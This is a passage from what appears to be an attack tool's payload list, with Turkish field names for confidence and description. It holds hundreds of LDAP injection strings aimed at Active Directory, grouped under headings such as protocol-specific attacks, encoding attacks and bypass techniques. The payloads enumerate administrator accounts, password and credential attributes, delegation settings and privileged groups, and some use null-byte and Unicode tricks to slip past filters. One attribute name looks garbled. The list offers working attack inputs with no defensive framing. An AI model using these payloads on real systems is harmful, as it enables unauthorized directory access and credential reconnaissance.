    {"payload": "*)(|(&(|(&(proxyAddresses=*admin*)(targetAddress=*admin*))(objectClass=user))", "guven": 0.86, "aciklama": "Admin proxy addresses"},
    {"payload": "*))(|(&(|(&(msExchMailboxGuid=*)(msExchArchiveGUID=*))(objectClass=user))", "guven": 0.82, "aciklama": "Exchange mailbox or archive"},
    {"payload": "*)(|(&(|(&(userCertificate=*)(cACertificate=*))(objectClass=user))", "guven": 0.84, "aciklama": "User or CA certificates"},
    {"payload": "*))(|(&(|(&(sidHistory=*)(altSecurityIdentities=*))(objectClass=user))", "guven": 0.88, "aciklama": "SID history or alt identities"},
    {"payload": "*)(|(&(|(&(primaryGroupID=512)(primaryGroupID=513))(objectClass=user))", "guven": 0.85, "aciklama": "Domain admin or user groups"},
    {"payload": "*))(|(&(|(&(groupType=-2147483646)(groupType=-2147483644))(objectClass=group))", "guven": 0.84, "aciklama": "Security or local groups"},
    {"payload": "*)(|(&(|(&(userAccountControl=512)(userAccountControl=66048))(objectClass=user))", "guven": 0.87, "aciklama": "Normal or never expire users"},
    {"payload": "*))(|(&(|(&(userAccountControl=4096)(userAccountControl=4128))(objectClass=computer))", "guven": 0.86, "aciklama": "Workstation or server trust"},
    {"payload": "*)(|(&(|(&(operatingSystem=*Windows*)(operatingSystem=*Server*))(objectClass=computer))", "guven": 0.83, "aciklama": "Windows or Server systems"},
    {"payload": "*))(|(&(|(&(servicePrincipalName=*MSSQL*)(servicePrincipalName=*HTTP*))(objectClass=computer))", "guven": 0.88, "aciklama": "SQL or Web server computers"},
    {"payload": "*)(|(&(|(&(cn=*DC*)(cn=*SERVER*))(objectClass=computer))", "guven": 0.89, "aciklama": "Domain controller or server names"},
    {"payload": "*))(|(&(|(&(dNSHostName=*.local)(dNSHostName=*.domain.*))(objectClass=computer))", "guven": 0.85, "aciklama": "Local or domain hostnames"},
    {"payload": "*)(|(&(|(&(ou=*Admin*)(ou=*Service*))(objectClass=organizationalUnit))", "guven": 0.82, "aciklama": "Admin or Service OUs"},
    {"payload": "*))(|(&(|(&(ou=*Users)(ou=*Computers))(objectClass=organizationalUnit))", "guven": 0.81, "aciklama": "Users or Computers OUs"},
    {"payload": "*)(|(&(|(&(objectCategory=person)(objectCategory=computer))(objectClass=*))", "guven": 0.83, "aciklama": "Person or computer categories"},
    {"payload": "*))(|(&(|(&(instanceType=4)(instanceType=0))(objectClass=*))", "guven": 0.80, "aciklama": "Standard or naming context"},
    {"payload": "*)(|(&(|(&(systemFlags=*)(isCriticalSystemObject=TRUE))(objectClass=*))", "guven": 0.85, "aciklama": "System flagged or critical objects"},
    {"payload": "*))(|(&(|(&(showInAdvancedViewOnly=TRUE)(isDeleted=TRUE))(objectClass=*))", "guven": 0.79, "aciklama": "Advanced view or deleted objects"},
    {"payload": "*)(|(&(|(&(objectGUID=*)(objectSid=*))(distinguishedName=*))", "guven": 0.81, "aciklama": "Objects with GUID or SID"},
    {"payload": "*))(|(&(|(&(whenCreated=*)(whenChanged=*))(objectClass=*))", "guven": 0.78, "aciklama": "Objects with creation or change times"},
    {"payload": "*)(|(&(|(&(uSNCreated=*)(uSNChanged=*))(objectClass=*))", "guven": 0.77, "aciklama": "Objects with USN values"},
    {"payload": "*))(|(&(|(&(nTSecurityDescriptor=*)(defaultSecurityDescriptor=*))(objectClass=*))", "guven": 0.82, "aciklama": "Objects with security descriptors"},
    {"payload": "*)(|(&(|(&(canonicalName=*)(name=*))(distinguishedName=*))", "guven": 0.76, "aciklama": "Objects with canonical or names"},
    {"payload": "*))(|(&(|(&(replPropertyMetaData=*)(dSCorePropagationData=*))(objectClass=*))", "guven": 0.78, "aciklama": "Objects with replication data"},
    {"payload": "*)(|(&(|(&(msDS-RevealedDSAs=*)(msDS-RevealedUsers=*))(objectClass=*))", "guven": 0.79, "aciklama": "RODC revealed objects"},
    {"payload": "*))(|(&(|(&(msDS-AllowedToActOnBehalfOfOtherIdentity=*)(msDS-GroupMSAMembership=*))(objectClass=user))", "guven": 0.90, "aciklama": "Delegation or MSA users"},
    {"payload": "*)(|(&(|(&(msDS-SupportedEncryptionTypes=*)(msDS-KeyVersionNumber=*))(servicePrincipalName=*))", "guven": 0.88, "aciklama": "Encryption enabled services"},
    {"payload": "*))(|(&(|(&(pwdProperties=*)(msDS-ResultantPSO=*))(objectClass=user))", "guven": 0.86, "aciklama": "Users with password policies"},
    {"payload": "*)(|(&(|(&(msDS-AuthenticatedAtDC=*)(msDS-IsPartialReplicaFor=*))(objectClass=*))", "guven": 0.81, "aciklama": "DC authentication metadata"},
    {"payload": "*))(|(&(|(&(comment=*admin*)(info=*admin*))(objectClass=*))", "guven": 0.84, "aciklama": "Admin comments or info"},
    {"payload": "*)(|(&(|(&(url=*admin*)(wWWHomePage=*admin*))(objectClass=user))", "guven": 0.82, "aciklama": "Admin web references"},
    {"payload": "*))(|(&(|(&(assistant=*admin*)(secretary=*admin*))(objectClass=user))", "guven": 0.83, "aciklama": "Admin assistants or secretaries"},
    {"payload": "*)(|(&(|(&(manager=*admin*)(directReports=*admin*))(objectClass=user))", "guven": 0.87, "aciklama": "Admin management hierarchy"},
    {"payload": "*))(|(&(|(&(homePhone=*0000)(telephoneNumber=*0000))(objectClass=user))", "guven": 0.75, "aciklama": "Default or test phone numbers"},
    {"payload": "*)(|(&(|(&(postalCode=00000)(streetAddress=*test*))(objectClass=user))", "guven": 0.74, "aciklama": "Test or default addresses"},
    {"payload": "*))(|(&(|(&(carLicense=*ADMIN*)(roomNumber=*ADMIN*))(objectClass=user))", "guven": 0.80, "aciklama": "Admin car or room assignments"},
    {"payload": "*)(|(&(|(&(preferredLanguage=en*)(countryCode=US))(objectClass=user))", "guven": 0.73, "aciklama": "English US users"},

    # Advanced Logical Operators (251-300)
    {"payload": "*))(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=2))(adminCount=1))", "guven": 0.94, "aciklama": "Active admin accounts bitwise"},
    {"payload": "*)(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=16))(servicePrincipalName=*))", "guven": 0.91, "aciklama": "Non-locked service accounts"},
    {"payload": "*))(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=32))(passwordNeverExpires=FALSE))", "guven": 0.87, "aciklama": "Password required expiring"},
    {"payload": "*)(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=64))(userCannotChangePassword=FALSE))", "guven": 0.85, "aciklama": "User can change password"},
    {"payload": "*))(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=128))(encryptedTextPasswordAllowed=FALSE))", "guven": 0.86, "aciklama": "No encrypted text passwords"},
    {"payload": "*)(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=256))(tempDuplicateAccount=FALSE))", "guven": 0.82, "aciklama": "Non-temporary accounts"},
    {"payload": "*))(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=512))(normalAccount=TRUE))", "guven": 0.84, "aciklama": "Verified normal accounts"},
    {"payload": "*)(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=2048))(interdomain TrustAccount=FALSE))", "guven": 0.88, "aciklama": "Non-trust accounts"},
    {"payload": "*))(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=4096))(workstationTrustAccount=FALSE))", "guven": 0.85, "aciklama": "Non-workstation trust"},
    {"payload": "*)(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=8192))(serverTrustAccount=FALSE))", "guven": 0.87, "aciklama": "Non-server trust accounts"},
    {"payload": "*))(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=65536))(dontExpirePassword=FALSE))", "guven": 0.86, "aciklama": "Expiring password accounts"},
    {"payload": "*)(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=131072))(mnsLogonAccount=FALSE))", "guven": 0.83, "aciklama": "Non-MNS logon accounts"},
    {"payload": "*))(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=262144))(smartcardRequired=FALSE))", "guven": 0.84, "aciklama": "Non-smartcard required"},
    {"payload": "*)(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=524288))(trustedForDelegation=FALSE))", "guven": 0.89, "aciklama": "Non-trusted delegation"},
    {"payload": "*))(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=1048576))(notDelegated=FALSE))", "guven": 0.88, "aciklama": "Delegation allowed accounts"},
    {"payload": "*)(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=2097152))(useDesKeyOnly=FALSE))", "guven": 0.85, "aciklama": "Non-DES key only accounts"},
    {"payload": "*))(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=4194304))(dontReqPreauth=FALSE))", "guven": 0.92, "aciklama": "Preauth required accounts"},
    {"payload": "*)(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=8388608))(passwordExpired=FALSE))", "guven": 0.87, "aciklama": "Non-expired password accounts"},
    {"payload": "*))(|(&(!(userAccountControl:1.2.840.113556.1.4.803:=16777216))(trustedToAuthForDelegation=FALSE))", "guven": 0.90, "aciklama": "Non-constrained delegation"},
    {"payload": "*)(|(userAccountControl:1.2.840.113556.1.4.804:=2)(userAccountControl:1.2.840.113556.1.4.804:=16)", "guven": 0.89, "aciklama": "Disabled or locked bitwise OR"},
    {"payload": "*))(|(userAccountControl:1.2.840.113556.1.4.804:=512)(userAccountControl:1.2.840.113556.1.4.804:=4096)", "guven": 0.86, "aciklama": "Normal or workstation trust OR"},
    {"payload": "*)(|(userAccountControl:1.2.840.113556.1.4.804:=65536)(userAccountControl:1.2.840.113556.1.4.804:=524288)", "guven": 0.91, "aciklama": "Never expire or trusted deleg OR"},
    {"payload": "*))(|(groupType:1.2.840.113556.1.4.804:=-2147483648)(groupType:1.2.840.113556.1.4.804:=2)", "guven": 0.85, "aciklama": "Security or global group bitwise"},
    {"payload": "*)(|(groupType:1.2.840.113556.1.4.804:=4)(groupType:1.2.840.113556.1.4.804:=8)", "guven": 0.84, "aciklama": "Local or universal group bitwise"},
    {"payload": "*))(|(systemFlags:1.2.840.113556.1.4.804:=33554432)(systemFlags:1.2.840.113556.1.4.804:=134217728)", "guven": 0.87, "aciklama": "System critical objects bitwise"},
    {"payload": "*)(|(instanceType:1.2.840.113556.1.4.804:=1)(instanceType:1.2.840.113556.1.4.804:=2)", "guven": 0.83, "aciklama": "Naming context instances bitwise"},
    {"payload": "*))(|(searchFlags:1.2.840.113556.1.4.804:=1)(searchFlags:1.2.840.113556.1.4.804:=2)", "guven": 0.82, "aciklama": "Indexed or ANR attributes bitwise"},
    {"payload": "*)(|(attributeSecurityGUID=*)(schemaIDGUID=*)", "guven": 0.81, "aciklama": "Schema security GUIDs"},
    {"payload": "*))(|(defaultHidingValue=TRUE)(showInAdvancedViewOnly=TRUE)", "guven": 0.80, "aciklama": "Hidden or advanced view objects"},
    {"payload": "*)(|(isSingleValued=TRUE)(isDefunct=TRUE)", "guven": 0.79, "aciklama": "Single valued or defunct attrs"},
    {"payload": "*))(|(rangeLower=*)(rangeUpper=*)", "guven": 0.78, "aciklama": "Attributes with value ranges"},
    {"payload": "*)(|(linkID=*)(attributeID=*)", "guven": 0.81, "aciklama": "Linked or numbered attributes"},
    {"payload": "*))(|(oMSyntax=*)(attributeSyntax=*)", "guven": 0.80, "aciklama": "Syntax defined attributes"},
    {"payload": "*)(|(isMemberOfPartialAttributeSet=TRUE)(isGlobalCatalogReady=TRUE)", "guven": 0.83, "aciklama": "GC ready attributes"},
    {"payload": "*))(|(systemOnly=TRUE)(isSystemAuxClass=TRUE)", "guven": 0.84, "aciklama": "System only or aux classes"},
    {"payload": "*)(|(defaultObjectCategory=*)(governsID=*)", "guven": 0.82, "aciklama": "Schema class definitions"},
    {"payload": "*))(|(subClassOf=*)(auxiliaryClass=*)", "guven": 0.81, "aciklama": "Class inheritance or auxiliary"},
    {"payload": "*)(|(possSuperiors=*)(systemPossSuperiors=*)", "guven": 0.80, "aciklama": "Possible superior classes"},
    {"payload": "*))(|(mayContain=*)(systemMayContain=*)", "guven": 0.79, "aciklama": "Optional attribute containment"},
    {"payload": "*)(|(mustContain=*)(systemMustContain=*)", "guven": 0.82, "aciklama": "Required attribute containment"},
    {"payload": "*))(|(rDNAttID=*)(defaultSecurityDescriptor=*)", "guven": 0.83, "aciklama": "RDN or security descriptors"},
    {"payload": "*)(|(objectClassCategory=*)(isDefunct=FALSE)", "guven": 0.81, "aciklama": "Active object class categories"},
    {"payload": "*))(|(schemaFlagsEx=*)(msDS-IntId =*)", "guven": 0.80, "aciklama": "Extended schema flags"},
    {"payload": "*)(|(msDS-ClaimAttributeSource=*)(msDS-ClaimValueType=*)", "guven": 0.82, "aciklama": "Claims based attributes"},
    {"payload": "*))(|(msDS-MembersForAzRole=*)(msDS-AzApplicationData=*)", "guven": 0.83, "aciklama": "Authorization store data"},
    {"payload": "*)(|(msDS-TasksForAzTask=*)(msDS-OperationsForAzTask=*)", "guven": 0.81, "aciklama": "AzMan task definitions"},
    {"payload": "*))(|(msDS-NonMembersForAzRole=*)(msDS-AzClassId=*)", "guven": 0.82, "aciklama": "AzMan role exclusions"},
    {"payload": "*)(|(msDS-AzBizRule=*)(msDS-AzBizRuleLanguage=*)", "guven": 0.84, "aciklama": "AzMan business rules"},
    {"payload": "*))(|(msDS-AzLastImportedBizRulePath=*)(msDS-AzGenericData=*)", "guven": 0.80, "aciklama": "AzMan imported rules"},
    {"payload": "*)(|(frsComputerReference=*)(frsComputerReferenceBL=*)", "guven": 0.79, "aciklama": "FRS computer references"},
    {"payload": "*))(|(fRSMemberReference=*)(fRSMemberReferenceBL=*)", "guven": 0.80, "aciklama": "FRS member references"},
    {"payload": "*)(|(serverReference=*)(serverReferenceBL=*)", "guven": 0.81, "aciklama": "Server object references"},

    # Protocol-Specific Attacks (301-350)
    {"payload": "*))(|(ldapDisplayName=userPassword)(ldapDisplayName=unicodePwd)", "guven": 0.93, "aciklama": "Password attribute enumeration"},
    {"payload": "*)(|(ldapDisplayName=ntPwdHistory)(ldapDisplayName=lmPwdHistory)", "guven": 0.92, "aciklama": "Password history attributes"},
    {"payload": "*))(|(ldapDisplayName=dBCSPwd)(ldapDisplayName=supplementalCredentials)", "guven": 0.91, "aciklama": "Legacy password attributes"},
    {"payload": "*)(|(ldapDisplayName=userAccountControl)(ldapDisplayName=primaryGroupID)", "guven": 0.88, "aciklama": "Account control attributes"},
    {"payload": "*))(|(ldapDisplayName=objectSid)(ldapDisplayName=sIDHistory)", "guven": 0.90, "aciklama": "Security identifier attributes"},
    {"payload": "*)(|(ldapDisplayName=servicePrincipalName)(ldapDisplayName=altSecurityIdentities)", "guven": 0.89, "aciklama": "Service and alt identity attrs"},
    {"payload": "*))(|(ldapDisplayName=msDS-AllowedToActOnBehalfOfOtherIdentity)(ldapDisplayName=msDS-AllowedToDelegateTo)", "guven": 0.94, "aciklama": "Delegation permission attributes"},
    {"payload": "*)(|(ldapDisplayName=userCertificate)(ldapDisplayName=cACertificate)", "guven": 0.86, "aciklama": "Certificate storage attributes"},
    {"payload": "*))(|(ldapDisplayName=nTSecurityDescriptor)(ldapDisplayName=defaultSecurityDescriptor)", "guven": 0.87, "aciklama": "Security descriptor attributes"},
    {"payload": "*)(|(adminDisplayName=*Password*)(adminDisplayName=*Security*)", "guven": 0.85, "aciklama": "Security related admin names"},
    {"payload": "*))(|(cn=ms-Exch*)(cn=ms-DS*)", "guven": 0.83, "aciklama": "Exchange or DS schema objects"},
    {"payload": "*)(|(cn=PKI*)(cn=Certificate*)", "guven": 0.84, "aciklama": "PKI related schema objects"},
    {"payload": "*))(|(cn=ForeignSecurityPrincipals)(cn=LostAndFound)", "guven": 0.82, "aciklama": "Special container objects"},
    {"payload": "*)(|(cn=Configuration)(cn=Schema)", "guven": 0.88, "aciklama": "Configuration naming contexts"},
    {"payload": "*))(|(cn=Partitions)(cn=Sites)", "guven": 0.85, "aciklama": "AD topology containers"},
    {"payload": "*)(|(cn=Services)(cn=System)", "guven": 0.86, "aciklama": "Service and system containers"},
    {"payload": "*))(|(cn=NTDS Settings)(cn=RID Manager)", "guven": 0.89, "aciklama": "NTDS and RID system objects"},
    {"payload": "*)(|(cn=Infrastructure)(cn=Computers)", "guven": 0.84, "aciklama": "Infrastructure and computer containers"},
    {"payload": "*))(|(cn=Users)(cn=Builtin)", "guven": 0.83, "aciklama": "Default user containers"},
    {"payload": "*)(|(cn=Domain Controllers)(cn=Enterprise Admins)", "guven": 0.91, "aciklama": "High privilege groups"},
    {"payload": "*))(|(cn=Schema Admins)(cn=Administrators)", "guven": 0.92, "aciklama": "Administrative groups"},
    {"payload": "*)(|(cn=Account Operators)(cn=Server Operators)", "guven": 0.89, "aciklama": "Operator privilege groups"},
    {"payload": "*))(|(cn=Print Operators)(cn=Backup Operators)", "guven": 0.87, "aciklama": "Service operator groups"},
    {"payload": "*)(|(cn=Replicator)(cn=Pre-Windows 2000)", "guven": 0.85, "aciklama": "Legacy and replication groups"},
    {"payload": "*))(|(cn=Remote Desktop Users)(cn=Network Configuration Operators)", "guven": 0.84, "aciklama": "Remote access groups"},
    {"payload": "*)(|(cn=Performance Log Users)(cn=Performance Monitor Users)", "guven": 0.82, "aciklama": "Performance monitoring groups"},
    {"payload": "*))(|(cn=Distributed COM Users)(cn=IIS_IUSRS)", "guven": 0.83, "aciklama": "Application service groups"},
    {"payload": "*)(|(cn=Cryptographic Operators)(cn=Event Log Readers)", "guven": 0.85, "aciklama": "Security service groups"},
    {"payload": "*))(|(cn=Certificate Service DCOM Access)(cn=RDS*)", "guven": 0.84, "aciklama": "Certificate and RDS groups"},
    {"payload": "*)(|(cn=Hyper-V Administrators)(cn=Access Control Assistance Operators)", "guven": 0.86, "aciklama": "Virtualization admin groups"},
    {"payload": "*))(|(cn=RAS and IAS Servers)(cn=Terminal Server License Servers)", "guven": 0.83, "aciklama": "Infrastructure server groups"},
    {"payload": "*)(|(cn=Windows Authorization Access Group)(cn=Pre-Windows 2000 Compatible Access)", "guven": 0.87, "aciklama": "Authorization access groups"},
    {"payload": "*))(|(cn=Incoming Forest Trust Builders)(cn=DHCP*)", "guven": 0.85, "aciklama": "Trust and DHCP groups"},
    {"payload": "*)(|(cn=DnsAdmins)(cn=DnsUpdateProxy)", "guven": 0.88, "aciklama": "DNS administrative groups"},
    {"payload": "*))(|(cn=WINS Users)(cn=Group Policy Creator Owners)", "guven": 0.86, "aciklama": "WINS and GP admin groups"},
    {"payload": "*)(|(cn=Enterprise Read-only Domain Controllers)(cn=Cloneable Domain Controllers)", "guven": 0.87, "aciklama": "DC special groups"},
    {"payload": "*))(|(cn=Protected Users)(cn=Key Admins)", "guven": 0.90, "aciklama": "Security enhanced groups"},
    {"payload": "*)(|(cn=Enterprise Key Admins)(cn=Storage Replica Administrators)", "guven": 0.89, "aciklama": "Enterprise admin groups"},
    {"payload": "*))(|(ou=Domain Controllers)(ou=Microsoft Exchange Security Groups)", "guven": 0.85, "aciklama": "Special organizational units"},
    {"payload": "*)(|(msDFSR-ComputerReference=*)(msDFSR-MemberReference=*)", "guven": 0.82, "aciklama": "DFSR replication references"},
    {"payload": "*))(|(msDGGGGGG-RootTrust=*)(msDFSR-ContentSetGuid=*)", "guven": 0.81, "aciklama": "DFSR content and trust"},
    {"payload": "*)(|(msDFSR-ReplicationGroupGuid=*)(msDFSR-ReplicationGroupType=*)", "guven": 0.83, "aciklama": "DFSR replication group info"},
    {"payload": "*))(|(msDFSR-Flags=*)(msDFSR-Options=*)", "guven": 0.80, "aciklama": "DFSR configuration flags"},
    {"payload": "*)(|(msDFSR-Schedule=*)(msDFSR-TombstoneExpiryInMin=*)", "guven": 0.81, "aciklama": "DFSR scheduling attributes"},
    {"payload": "*))(|(msDS-ManagedServiceAccount=*)(msDS-HostServiceAccount=*)", "guven": 0.88, "aciklama": "Managed service accounts"},
    {"payload": "*)(|(msDS-GroupManagedServiceAccount=*)(msDS-ManagedPasswordId=*)", "guven": 0.89, "aciklama": "Group managed service accounts"},
    {"payload": "*))(|(msDS-ManagedPasswordInterval=*)(msDS-ManagedPasswordPreviousId=*)", "guven": 0.87, "aciklama": "Managed password attributes"},

    # Unicode and Encoding Attacks (351-400)
    {"payload": "*)(|(cn=*\u0000*)(displayName=*\u0000*)", "guven": 0.85, "aciklama": "Null byte injection attempt"},
    {"payload": "*))(|(sAMAccountName=*\u00A0*)(userPrincipalName=*\u00A0*)", "guven": 0.84, "aciklama": "Non-breaking space injection"},
    {"payload": "*)(|(cn=*\u200B*)(description=*\u200B*)", "guven": 0.83, "aciklama": "Zero-width space injection"},
    {"payload": "*))(|(mail=*\u202E*@*)(url=*\u202E*)", "guven": 0.82, "aciklama": "Right-to-left override attack"},
    {"payload": "*)(|(cn=*\uFEFF*)(comment=*\uFEFF*)", "guven": 0.81, "aciklama": "Byte order mark injection"},
    {"payload": "*))(|(displayName=*\u2028*)(title=*\u2029*)", "guven": 0.80, "aciklama": "Line separator injection"},
    {"payload": "*)(|(homeDirectory=*\u0009*)(profilePath=*\u000A*)", "guven": 0.83, "aciklama": "Tab and newline injection"},
    {"payload": "*))(|(scriptPath=*\u000D*)(logonScript=*\u000B*)", "guven": 0.82, "aciklama": "Carriage return injection"},
    {"payload": "*)(|(telephoneNumber=*\u00AD*)(mobile=*\u034F*)", "guven": 0.79, "aciklama": "Soft hyphen and combining mark"},
    {"payload": "*))(|(postalAddress=*\u2060*)(streetAddress=*\u2061*)", "guven": 0.78, "aciklama": "Word joiner and function app"},
    {"payload": "*)(|(department=*\u2062*)(company=*\u2063*)", "guven": 0.77, "aciklama": "Invisible math separators"},
    {"payload": "*))(|(manager=*\u2064*)(assistant=*\u206A*)", "guven": 0.78, "aciklama": "Invisible plus and symmetry"},
    {"payload": "*)(|(cn=*\uD83D\uDE00*)(displayName=*\uD83D\uDD13*)", "guven": 0.76, "aciklama": "Emoji injection attempt"},
    {"payload": "*))(|(sAMAccountName=*\u0041\u0301*)(cn=*\u0065\u0301*)", "guven": 0.81, "aciklama": "Combining diacritical marks"},
    {"payload": "*)(|(userPrincipalName=*\u0131*@*)(mail=*\u0130*@*)", "guven": 0.82, "aciklama": "Turkish i injection"},
    {"payload": "*))(|(cn=*\u017F*)(sAMAccountName=*\u1E9E*)", "guven": 0.80, "aciklama": "Long s and sharp s"},
    {"payload": "*)(|(displayName=*\u0041\u030A*)(title=*\u00C5*)", "guven": 0.79, "aciklama": "A with ring normalization"},
    {"payload": "*))(|(description=*\u0046\u0046*)(comment=*\uFB00*)", "guven": 0.78, "aciklama": "FF ligature normalization"},
    {"payload": "*)(|(cn=*\u2126*)(sAMAccountName=*\u03A9*)", "guven": 0.81, "aciklama": "Ohm and Omega confusion"},
    {"payload": "*))(|(userPrincipalName=*\u006B*@*)(mail=*\u212A*@*)", "guven": 0.82, "aciklama": "Kelvin sign confusion"},
    {"payload": "*)(|(cn=*\u0041\u0300*)(displayName=*\u00C0*)", "guven": 0.80, "aciklama": "A grave normalization"},
    {"payload": "*))(|(sAMAccountName=*\u0020*)(cn=*\u00A0*)", "guven": 0.83, "aciklama": "Space character confusion"},
    {"payload": "*)(|(description=*\u002D*)(comment=*\u2010*)", "guven": 0.79, "aciklama": "Hyphen character confusion"},
    {"payload": "*))(|(cn=*\u0027*)(displayName=*\u2019*)", "guven": 0.78, "aciklama": "Apostrophe character confusion"},
    {"payload": "*)(|(title=*\u0022*)(department=*\u201D*)", "guven": 0.77, "aciklama": "Quote character confusion"},
    {"payload": "*))(|(cn=admin\u0000)(sAMAccountName=admin\u0000)", "guven": 0.88, "aciklama": "Null terminated admin"},
    {"payload": "*)(|(cn=\u0000admin)(displayName=\u0000admin)", "guven": 0.87, "aciklama": "Null prefixed admin"},
    {"payload": "*))(|(userPrincipalName=admin\u0000@*)(mail=admin\u0000@*)", "guven": 0.89, "aciklama": "Null in email addresses"},
    {"payload": "*)(|(cn=*\uE000*)(sAMAccountName=*\uF8FF*)", "guven": 0.75, "aciklama": "Private use area characters"},
    {"payload": "*))(|(description=*\uFDD0*)(comment=*\uFDEF*)", "guven": 0.74, "aciklama": "Non-character code points"},
    {"payload": "*)(|(cn=*\uFFFE*)(displayName=*\uFFFF*)", "guven": 0.73, "aciklama": "Non-character end markers"},
    {"payload": "*))(|(cn=*%00*)(sAMAccountName=*%00*)", "guven": 0.86, "aciklama": "URL encoded null bytes"},
    {"payload": "*)(|(cn=*%0A*)(description=*%0D*)", "guven": 0.84, "aciklama": "URL encoded line breaks"},
    {"payload": "*))(|(cn=*%20*)(displayName=*%C2%A0*)", "guven": 0.83, "aciklama": "URL encoded spaces"},
    {"payload": "*)(|(cn=*\\00*)(sAMAccountName=*\\00*)", "guven": 0.87, "aciklama": "Escaped null bytes"},
    {"payload": "*))(|(cn=*\\0A*)(description=*\\0D*)", "guven": 0.85, "aciklama": "Escaped line breaks"},
    {"payload": "*)(|(cn=*\\20*)(displayName=*\\A0*)", "guven": 0.84, "aciklama": "Escaped space characters"},
    {"payload": "*))(|(cn=*\x00*)(sAMAccountName=*\x00*)", "guven": 0.88, "aciklama": "Hex encoded null bytes"},
    {"payload": "*)(|(cn=*\x0A*)(description=*\x0D*)", "guven": 0.86, "aciklama": "Hex encoded line breaks"},
    {"payload": "*))(|(cn=*\x20*)(displayName=*\xA0*)", "guven": 0.85, "aciklama": "Hex encoded spaces"},
    {"payload": "*)(|(cn=*&#x00;*)(sAMAccountName=*&#0;*)", "guven": 0.83, "aciklama": "HTML entity null bytes"},
    {"payload": "*))(|(cn=*&#x0A;*)(description=*&#10;*)", "guven": 0.82, "aciklama": "HTML entity line breaks"},
    {"payload": "*)(|(cn=*&#x20;*)(displayName=*&#160;*)", "guven": 0.81, "aciklama": "HTML entity spaces"},
    {"payload": "*))(|(cn=*&lt;*)(description=*&gt;*)", "guven": 0.80, "aciklama": "HTML entity brackets"},
    {"payload": "*)(|(cn=*&amp;*)(comment=*&quot;*)", "guven": 0.79, "aciklama": "HTML entity ampersand quote"},
    {"payload": "*))(|(cn=*&apos;*)(title=*&nbsp;*)", "guven": 0.78, "aciklama": "HTML entity apostrophe space"},
    {"payload": "*)(|(cn=*\u001F*)(displayName=*\u007F*)", "guven": 0.82, "aciklama": "Control character injection"},
    {"payload": "*))(|(cn=*\u0080*)(sAMAccountName=*\u009F*)", "guven": 0.81, "aciklama": "Extended control characters"},
    {"payload": "*)(|(cn=*\u00A1*)(displayName=*\u00BF*)", "guven": 0.77, "aciklama": "Inverted punctuation marks"},
    {"payload": "*))(|(cn=*\u2000*)(sAMAccountName=*\u200A*)", "guven": 0.80, "aciklama": "Various space characters"},

    # Advanced Bypass Techniques (401-450)
    {"payload": "*))(|(|(|(cn=admin)(cn=administrator))(|(cn=root)(cn=sa)))", "guven": 0.93, "aciklama": "Multi-level OR admin bypass"},
    {"payload": "*)(|(|(|(sAMAccountName=admin*)(sAMAccountName=*admin))(|(userPrincipalName=admin*@*)(mail=admin*@*)))", "guven": 0.92, "aciklama": "Complex admin account detection"},
    {"payload": "*))(|(|(|(objectClass=user)(objectClass=person))(|(objectClass=contact)(objectClass=computer)))", "guven": 0.85, "aciklama": "Multi-object class enumeration"},
    {"payload": "*)(|(|(|(adminCount=1)(primaryGroupID=512))(|(memberOf=*admin*)(memberOf=*Domain Admins*)))", "guven": 0.94, "aciklama": "Multi-vector admin detection"},
    {"payload": "*))(|(|(|(servicePrincipalName=*SQL*)(servicePrincipalName=*HTTP*))(|(servicePrincipalName=*CIFS*)(servicePrincipalName=*HOST*)))", "guven": 0.89, "aciklama": "Service account enumeration"},
    {"payload": "*)(|(|(|(userAccountControl=512)(userAccountControl=66048))(|(userAccountControl=4096)(userAccountControl=4128)))", "guven": 0.87, "aciklama": "Account type enumeration"},
    {"payload": "*))(|(|(|(pwdLastSet=0)(badPwdCount>=3))(|(lockoutTime>=*)(accountExpires<=*)))", "guven": 0.90, "aciklama": "Vulnerable account detection"},
    {"payload": "*)(|(|(|(lastLogon<=*)(lastLogonTimestamp<=*))(|(logonCount=0)(whenCreated<=*)))", "guven": 0.86, "aciklama": "Stale account detection"},
    {"payload": "*))(|(|(|(department=*IT*)(department=*Security*))(|(title=*admin*)(title=*manager*)))", "guven": 0.84, "aciklama": "Privileged role detection"},
    {"payload": "*)(|(|(|(homeDirectory=*admin*)(profilePath=*admin*))(|(scriptPath=*admin*)(userWorkstations=*admin*)))", "guven": 0.85, "aciklama": "Admin path detection"},
    {"payload": "*))(|(|(|(mail=*admin*@*)(proxyAddresses=*admin*))(|(targetAddress=*admin*)(legacyExchangeDN=*admin*)))", "guven": 0.88, "aciklama": "Admin email detection"},
    {"payload": "*)(|(|(|(telephoneNumber=*0000)(mobile=*0000))(|(homePhone=*0000)(otherTelephone=*0000)))", "guven": 0.78, "aciklama": "Default phone number detection"},
    {"payload": "*))(|(|(|(extensionAttribute1=*admin*)(extensionAttribute5=*VIP*))(|(extensionAttribute10=*PRIV*)(info=*admin*)))", "guven": 0.87, "aciklama": "Privileged extension attributes"},
    {"payload": "*)(|(|(|(userCertificate=*)(cACertificate=*))(|(msDS-KeyVersionNumber=*)(servicePrincipalName=*)))", "guven": 0.86, "aciklama": "Certificate or Kerberos enabled"},
    {"payload": "*))(|(|(|(sidHistory=*)(altSecurityIdentities=*))(|(msDS-AllowedToActOnBehalfOfOtherIdentity=*)(trustedForDelegation=TRUE)))", "guven": 0.92, "aciklama": "Delegation or migration accounts"},
    {"payload": "*)(|(|(|(groupType=-2147483646)(groupType=-2147483644))(|(groupType=-2147483640)(groupType=-2147483643)))", "guven": 0.84, "aciklama": "All group type enumeration"},
    {"payload": "*))(|(|(|(operatingSystem=*Windows*)(operatingSystem=*Server*))(|(operatingSystem=*Linux*)(operatingSystem=*Unix*)))", "guven": 0.83, "aciklama": "Operating system enumeration"},
